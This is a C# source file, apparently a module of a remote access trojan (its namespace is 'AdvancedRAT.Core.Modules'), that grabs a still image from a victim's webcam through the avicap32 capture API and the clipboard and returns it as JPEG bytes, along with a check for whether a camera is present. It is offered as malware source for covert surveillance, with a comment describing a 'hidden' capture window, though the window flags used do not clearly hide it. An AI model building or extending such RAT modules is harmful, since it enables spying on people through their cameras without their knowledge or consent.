using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace AdvancedRAT.Core.Modules
{
    public class WebcamController
    {
        [DllImport("avicap32.dll")]
        protected static extern IntPtr capCreateCaptureWindow(
            string lpszWindowName,
            int dwStyle,
            int x,
            int y,
            int nWidth,
            int nHeight,
            IntPtr hWndParent,
            int nID);

        [DllImport("user32.dll")]
        protected static extern bool DestroyWindow(IntPtr hwnd);

        [DllImport("user32.dll")]
        protected static extern bool SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);

        [DllImport("user32.dll")]
        protected static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        const int WM_CAP = 0x400;
        const int WM_CAP_DRIVER_CONNECT = WM_CAP + 10;
        const int WM_CAP_DRIVER_DISCONNECT = WM_CAP + 11;
        const int WM_CAP_EDIT_COPY = WM_CAP + 30;
        const int WM_CAP_SET_PREVIEW = WM_CAP + 50;
        const int WM_CAP_SET_PREVIEWRATE = WM_CAP + 52;
        const int WM_CAP_SET_SCALE = WM_CAP + 53;
        const int WS_CHILD = 0x40000000;
        const int WS_VISIBLE = 0x10000000;

        private static IntPtr CapWnd = IntPtr.Zero;

        public static async Task<byte[]> CaptureWebcamImage()
        {
            return await Task.Run(() =>
            {
                try
                {
                    // Create a hidden capture window
                    CapWnd = capCreateCaptureWindow("WebcamCapture", WS_CHILD | WS_VISIBLE, 0, 0, 320, 240, IntPtr.Zero, 0);

                    if (CapWnd != IntPtr.Zero)
                    {
                        // Connect to the first webcam
                        SendMessage(CapWnd, WM_CAP_DRIVER_CONNECT, 0, 0);

                        // Set preview scale
                        SendMessage(CapWnd, WM_CAP_SET_SCALE, 1, 0);

                        // Set preview rate (15fps)
                        SendMessage(CapWnd, WM_CAP_SET_PREVIEWRATE, 66, 0);

                        // Enable preview
                        SendMessage(CapWnd, WM_CAP_SET_PREVIEW, 1, 0);

                        // Wait for camera to initialize
                        System.Threading.Thread.Sleep(1000);

                        // Copy image to clipboard
                        SendMessage(CapWnd, WM_CAP_EDIT_COPY, 0, 0);

                        // Disconnect from the camera
                        SendMessage(CapWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);

                        // Destroy the capture window
                        DestroyWindow(CapWnd);

                        // Try to get image from clipboard
                        if (System.Windows.Forms.Clipboard.ContainsImage())
                        {
                            Image img = System.Windows.Forms.Clipboard.GetImage();
                            if (img != null)
                            {
                                using (MemoryStream ms = new MemoryStream())
                                {
                                    img.Save(ms, ImageFormat.Jpeg);
                                    return ms.ToArray();
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Webcam capture failed: {ex.Message}");
                }

                return new byte[0];
            });
        }

        public static async Task<bool> IsWebcamAvailable()
        {
            try
            {
                // Try to create a capture window
                IntPtr testCapWnd = capCreateCaptureWindow("TestCapture", WS_CHILD | WS_VISIBLE, 0, 0, 320, 240, IntPtr.Zero, 0);

                if (testCapWnd != IntPtr.Zero)
                {
                    // Try to connect to the first webcam
                    bool connected = SendMessage(testCapWnd, WM_CAP_DRIVER_CONNECT, 0, 0);
                    
                    if (connected)
                    {
                        // Disconnect immediately
                        SendMessage(testCapWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);
                    }

                    // Destroy the test window
                    DestroyWindow(testCapWnd);

                    return connected;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Webcam availability check failed: {ex.Message}");
            }

            return false;
        }
    }
}